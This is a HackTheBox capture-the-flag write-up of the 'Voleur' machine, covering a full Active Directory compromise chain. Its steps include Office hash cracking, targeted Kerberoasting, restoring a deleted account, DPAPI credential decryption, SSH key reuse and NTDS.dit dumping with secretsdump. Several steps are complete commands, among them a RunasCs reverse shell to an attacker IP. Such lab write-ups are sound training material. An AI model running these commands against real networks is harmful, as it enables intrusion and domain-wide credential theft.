---
title: Voleur
categories: [HackTheBox]
tags: [active-directory, ldap, smb, office-password-cracking, kerberoasting, targeted-kerberoasting, deleted-object-restoration, dpapi, dpapi-credential-extraction, ssh-key, ntds-dit-backup, bloodhound]
media_subpath: /images/hackthebox_voleur/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/635619778e50cc8f69df91cc6ae149c4.png'
---

## Summary

**Voleur** is a HackTheBox machine that demonstrates a comprehensive Active Directory penetration testing scenario involving multiple privilege escalation techniques and credential recovery methods. The attack begins with provided initial credentials for a low-privileged user account. Through SMB share enumeration, we discover a password-protected Excel file containing sensitive service account credentials. After cracking the Excel password, we leverage the service account credentials to perform targeted Kerberoasting attacks. By restoring deleted user objects and extracting DPAPI-protected credentials, we gain access to higher-privileged accounts. Finally, we discover SSH keys and Active Directory backup files that enable complete domain compromise.

## Initial Access

### Provided Credentials

As is common in real-world Windows penetration tests, we start with credentials for the following account:
- **Username**: `ryan.naylor`
- **Password**: `HollowOct31Nyt`

> This represents a realistic scenario where initial access is gained through social engineering, password reuse, or other initial compromise vectors.
{: .prompt-info}

## Initial Enumeration

### SMB Connection

We begin by establishing an SMB connection to verify access:

```bash
nxc smb $IP
```

```
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
```

![SMB Connection Verification](file-20250810213055932.png)

> **Critical Security Configuration**: The domain controller shows `(NTLM:False)`, indicating that NTLM authentication is **disabled**. This means we must use **Kerberos authentication exclusively** for all connections throughout the penetration test. All authentication attempts will require the `-k` flag to force Kerberos authentication, and we must ensure our system time is synchronized with the domain controller as Kerberos is time-sensitive.
{: .prompt-danger}

> The server requires SMB signing and uses SMBv2/3, indicating a more modern and secure configuration. The domain name `voleur.htb` is identified.
{: .prompt-tip}

### LDAP User Enumeration

We enumerate domain users using LDAP. Since NTLM is disabled, we **must** use Kerberos authentication with the `-k` flag. First, we need to sync time with the domain controller as Kerberos authentication is time-sensitive:

```bash
sudo ntpdate -s $IP
nxc ldap $IP -u $USERAD -p $PASS -k --users-export users
```

> Command breakdown:
>- `nxc ldap` : NetExec (formerly CrackMapExec) LDAP module
>- `-u $USERAD -p $PASS` : Username and password for authentication
>- `-k` : **Required** - Force Kerberos authentication (NTLM is disabled on this DC)
>- `--users-export users` : Export enumerated users to a file
{: .prompt-info}

> **Note**: Without the `-k` flag, authentication will fail because NTLM is disabled on this domain controller. All subsequent connections must use Kerberos authentication.
{: .prompt-warning}

The enumeration reveals several domain users:

```
LDAP        10.10.11.76     389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
LDAP        10.10.11.76     389    DC               [*] Enumerated 11 domain users: voleur.htb
Username                    Last PW Set       BadPW  Description
Administrator              2025-01-28 20:35:13 6     Built-in account for administering the computer/domain
Guest                      <never>            0      Built-in account for guest access to the computer/domain
krbtgt                     2025-01-29 08:43:06 0     Key Distribution Center Service Account
ryan.naylor                2025-01-29 09:26:46 0     First-Line Support Technician
marie.bryant               2025-01-29 09:21:07 6     First-Line Support Technician
lacey.miller               2025-01-29 09:20:10 6     Second-Line Support Technician
svc_ldap                   2025-01-29 09:20:54 0
svc_backup                 2025-01-29 09:20:36 5
svc_iis                    2025-01-29 09:20:45 0
jeremy.combs               2025-01-29 15:10:32 1     Third-Line Support Technician
svc_winrm                  2025-01-31 09:10:12 0
```

![LDAP User Enumeration](file-20250810213929506.png)

### SMB Share Enumeration

We enumerate accessible SMB shares. Since NTLM is disabled, we must use the `-k` flag to force Kerberos authentication:

```bash
nxc smb $IP -u $USERAD -p $PASS -k --shares --smb-timeout 300
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Finance
HR
IPC$            READ            Remote IPC
IT              READ
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

![SMB Share Enumeration](file-20250810214109586.png)

> The `IT` share is accessible with READ permissions. This may contain files with sensitive information.
{: .prompt-warning}

## Excel File Password Cracking

### Accessing the IT Share

We connect to the IT share to explore its contents. The `-k` flag is required because NTLM is disabled on this domain controller:

```bash
smbclient.py -k $DOMAIN/$USERAD:$PASS@$FQDN
```

```bash
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 20:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 09:40:17 2025 First-Line Support
# cd "First-Line Support"
# ls
drw-rw-rw-          0  Wed Jan 29 09:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 09:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 22:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```

We discover an Excel file named `Access_Review.xlsx` that is password-protected when opened.

### Extracting and Cracking the Hash

We extract the hash from the password-protected Excel file using `office2john`:

```bash
office2john.py Access_Review.xlsx > xlsx_hash
```

Then we use `hashcat` to crack the password:

```bash
hashcat ./xlsx_hash --username --show
```

Hashcat automatically detects the hash type as MS Office 2013:

```
9600 | MS Office 2013 | Document

Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
```

> The password for the Excel file is `football1`. Office 2013 uses a different encryption scheme than newer versions, making it potentially easier to crack.
{: .prompt-info}

### Extracting Service Account Credentials

After opening the Excel file with the password, we discover sensitive service account credentials:

![Access Review Excel File Contents](file-20250810214746085.png)

The document contains:

```
Ryan.Naylor     First-Line Support Technician   SMB     Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant    First-Line Support Technician   SMB
Lacey.Miller    Second-Line Support Technician  Remote Management Users
Todd.Wolfe      Second-Line Support Technician  Remote Management Users Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs    Third-Line Support Technician   Remote Management Users.        Has access to Software folder.
Administrator   Administrator   Domain Admin    Not to be used for daily tasks!

Service Accounts
svc_backup              Windows Backup  Speak to Jeremy!
svc_ldap                LDAP Services   P/W - M1XyC9pW7qT5Vn
svc_iis         IIS Administration      P/W - N5pXyW1VqM7CZ8
svc_winrm               Remote Management       Need to ask Lacey as she reset this recently.
```

> **Critical Information Discovered**:
> - Service account passwords are stored in plaintext
> - `svc_ldap` password: `M1XyC9pW7qT5Vn`
> - `svc_iis` password: `N5pXyW1VqM7CZ8`
> - Note about deleted user `Todd.Wolfe` with password `NightT1meP1dg3on14`
{: .prompt-danger}

## Service Account Access and Privilege Escalation

### Validating Service Account Credentials

We verify the service account credentials work:

```bash
nxc ldap $FQDN -k -u svc_ldap -p 'M1XyC9pW7qT5Vn'
nxc ldap $FQDN -k -u svc_iis -p 'N5pXyW1VqM7CZ8'
```

Both credentials authenticate successfully.

### Kerberos Ticket Generation

We generate a Kerberos ticket for the `svc_ldap` account:

```bash
nxc smb $IP -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --generate-tgt svc_ldap
```

```
SMB         10.10.11.76     445    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
SMB         10.10.11.76     445    DC               [+] TGT saved to: svc_ldap.ccache
SMB         10.10.11.76     445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=svc_ldap.ccache
```

### ACL Enumeration with BloodyAD

Using the Kerberos ticket, we enumerate writable objects using `bloodyAD`:

```bash
export KRB5CCNAME=svc_ldap.ccache
bloodyAD get writable
```

The enumeration reveals several writable objects:

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE
```

> **Critical Discovery**: We have `WRITE` and `CREATE_CHILD` permissions over the `OU=Second-Line Support Technicians,DC=voleur,DC=htb` organizational unit. This combination of permissions is equivalent to **GenericWrite**, which allows us to create, modify, and restore objects within this OU.
{: .prompt-warning}

> From the Excel document we recovered earlier, we learned that `Todd.Wolfe` was a **Second-Line Support Technician** who was deleted. The document stated: "Todd.Wolfe - Second-Line Support Technician - Remote Management Users Leaver. Password was reset to NightT1meP1dg3on14 and account deleted." Since we have GenericWrite permissions over the Second-Line Support Technicians OU, and we can run commands on the server as `svc_ldap`, we can restore this deleted object.
{: .prompt-info}

> We also have `WriteSPN` permission over `svc_winrm`, which allows us to modify its Service Principal Names (SPNs) and perform targeted Kerberoasting.
{: .prompt-warning}

![Bloodhound ACL Analysis](file-20250810215123660.png)

## Targeted Kerberoasting

### Performing Targeted Kerberoasting

Since we have `WriteSPN` permissions over `svc_winrm`, we can modify its SPN and perform targeted Kerberoasting:

```bash
export KRB5CCNAME=svc_ldap.ccache
targetedKerberoast.py --dc-host dc -d voleur.htb --dc-ip 10.10.11.76 -k
```

The attack successfully extracts Kerberos tickets for:

1. **lacey.miller** - Second-Line Support Technician
2. **svc_winrm** - Service account

```
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$...[truncated]...

[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$...[truncated]...
```

> Targeted Kerberoasting allows us to extract Kerberos service tickets for specific accounts by manipulating SPNs. This is more efficient than traditional Kerberoasting as it targets specific high-value accounts.
{: .prompt-info}

## WinRM Access and Privilege Escalation

### Generating WinRM Ticket

We generate a Kerberos ticket for `svc_winrm`:

```bash
nxc smb $IP -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --generate-tgt svc_winrm
```

This allows us to access the system via WinRM using Evil-WinRM:

![WinRM Access](file-20250810215833181.png)

![Service Account Shell](file-20250811024746588.png)
### Service Account Shell

We use `RunasCs` to get a shell as `svc_ldap`

```bash
*Evil-WinRM* PS C:\Users\svc_winrm> .\run.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.124:9999
```


![Service Logon Type Verification](file-20250811030009115.png)

We successfully receive a reverse shell as `svc_ldap`:

```
C:\Windows\system32>whoami
voleur\svc_ldap
```

## Deleted Object Restoration

### Enumerating Deleted Objects

Now that we have a shell as `svc_ldap` on the domain controller, we can enumerate deleted Active Directory objects. Recall that from the ACL enumeration, we discovered we have GenericWrite permissions (WRITE and CREATE_CHILD) over the `OU=Second-Line Support Technicians` organizational unit. The Excel document revealed that `Todd.Wolfe` was a Second-Line Support Technician who was deleted, which makes him a prime candidate for restoration.

With `svc_ldap` privileges, we can enumerate deleted Active Directory objects:

```powershell
PS C:\Users\svc_ldap> Get-ADObject -IncludeDeletedObjects -Filter {isdeleted -eq $true}
```

The enumeration reveals a deleted user object:

```
Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

![Deleted Object Restoration](file-20250811025951091.png)

> **Restoration Opportunity**: The `Todd.Wolfe` account was deleted but can be restored. From the Excel file, we know:
> - He was a Second-Line Support Technician (member of the OU we have GenericWrite permissions on)
> - His password was reset to `NightT1meP1dg3on14` before deletion
> - We have GenericWrite permissions over the Second-Line Support Technicians OU, which allows us to restore objects that belonged to this OU
{: .prompt-tip}

### Restoring the Deleted User

Since we have GenericWrite permissions over the Second-Line Support Technicians OU (where Todd.Wolfe originally belonged), and we're running commands as `svc_ldap` on the domain controller, we can restore the deleted user object using its GUID:

```powershell
PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

> The restoration succeeds because:
> 1. We have GenericWrite permissions (WRITE + CREATE_CHILD) over the OU where the object originally belonged
> 2. We're executing the command as `svc_ldap`, which has the necessary privileges to restore objects in the Second-Line Support Technicians OU
> 3. When restored, the object will return to its original location (the Second-Line Support Technicians OU)
{: .prompt-info}


### Authenticating as Todd.Wolfe

After restoration, we can authenticate with the credentials from the Excel file:

```bash
nxc ldap $FQDN -k -u todd.wolfe -p 'NightT1meP1dg3on14'
```

```
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```

## DPAPI Credential Extraction

### Accessing User Profile Data

With `todd.wolfe` credentials, we access the user's profile data via SMB:

```bash
KRB5CCNAME=todd.wolfe.ccache smbclient.py -dc-ip $IP -no-pass -k $FQDN
```

We navigate to the user's DPAPI-protected files:

```bash
# use IT
# cd "Second-Line Support"
# cd "Archived Users"
# cd todd.wolfe
# cd AppData/roaming/Microsoft/Protect
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
-rw-rw-rw-        740  Wed Jan 29 13:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 12:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 12:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# cd ../..
# cd Credentials
# ls
-rw-rw-rw-        398  Wed Jan 29 13:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
```

### Extracting DPAPI Master Key

We decrypt the DPAPI master key using the user's password:

```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
```

The master key is successfully decrypted:

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

![DPAPI Master Key Extraction](file-20250811154138658.png)

### Extracting Credentials

Using the master key, we decrypt the stored credential file:

```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

The credential reveals:

```
[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

> We successfully extracted the password `qT3V9pLXyN7W4m` for `jeremy.combs` from DPAPI-protected credentials stored in the user profile.
{: .prompt-warning}

## SSH Key Discovery

### Accessing Third-Line Support Folder

Using `jeremy.combs` credentials, we access the Third-Line Support folder via SMB:

```bash
smbclient.py -k $DOMAIN/$USERAD:$PASS@$FQDN
```

```bash
# use IT
# cd "Third-Line Support"
# ls
-rw-rw-rw-       2602  Thu Jan 30 16:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 16:07:35 2025 Note.txt.txt
# get Note.txt.txt
# get id_rsa
```

We retrieve both the SSH private key and a note file from the Third-Line Support folder.

### Decoding the SSH Key

The `id_rsa` file can give us the user information once we decode it from base64:

```bash
cat id_rsa | base64 -d > id_rsa_decoded
cat id_rsa_decoded
```

After decoding, we can see the SSH private key contents:

![Catting the base64 decoded key shows us is for the svc_backup user](file-20250811155429120.png)

> The decoded SSH key reveals it's an OpenSSH private key. By examining the key or attempting authentication, we can determine which user account this key belongs to. The key appears to be for the `svc_backup` user.
{: .prompt-info}

### SSH Authentication

We set the correct permissions on the decoded SSH key and authenticate to the backup server:

```bash
chmod 600 id_rsa_decoded
ssh -i id_rsa_decoded svc_backup@<backup-server-ip>
```

![authentication successfull on ssh](file-20250811155452348.png)

## Active Directory Backup Access

### Discovering AD Backup Files

On the server, we locate Active Directory backup files:

```bash
svc_backup@DC:~$ find /mnt/c/IT/Third-Line\ Support/ -type f
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.jfm
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
/mnt/c/IT/Third-Line Support/id_rsa
/mnt/c/IT/Third-Line Support/Note.txt.txt
```

![Active Directory Backup Files](file-20250811170144374.png)

> **Critical Discovery**: The backup server contains:
> - `ntds.dit` - Active Directory database containing all user credentials
> - `SECURITY` and `SYSTEM` registry hives - Required to decrypt the NTDS.dit file
> - These files enable DCSync attacks and complete domain compromise
{: .prompt-danger}

### Extracting Domain Credentials

With the NTDS.dit backup and registry hives, we can extract all domain user hashes:

```bash
secretsdump.py -ntds /mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit -system /mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM -security /mnt/c/IT/Third-Line\ Support/Backups/registry/SECURITY LOCAL
```

This will extract all NTLM hashes for domain users, including the Administrator account, allowing complete domain compromise.

## Conclusion

### Quick Recap

- Initial access was provided through credentials for `ryan.naylor`
- SMB share enumeration revealed a password-protected Excel file
- Excel password was cracked, revealing service account credentials
- Service account access enabled targeted Kerberoasting attacks
- Deleted user objects were restored to regain access
- DPAPI-protected credentials were extracted to obtain additional passwords
- SSH keys were discovered, providing access to backup systems
- Active Directory backup files were located, enabling complete domain compromise

### Lessons Learned

- **Information Disclosure**: Password-protected files stored in accessible shares can be cracked
- **Credential Storage**: Service account passwords should never be stored in plaintext documents
- **Access Control Lists**: Proper ACL management is critical to prevent unauthorized object manipulation
- **Deleted Objects**: Deleted AD objects can be restored and may contain sensitive information
- **DPAPI Security**: User profile encryption requires strong passwords and proper key management
- **Backup Security**: AD backup files contain all domain credentials and must be strictly protected
- **SSH Key Management**: Private keys should never be stored in shared directories
- **Defense in Depth**: Multiple security controls should protect sensitive systems and data
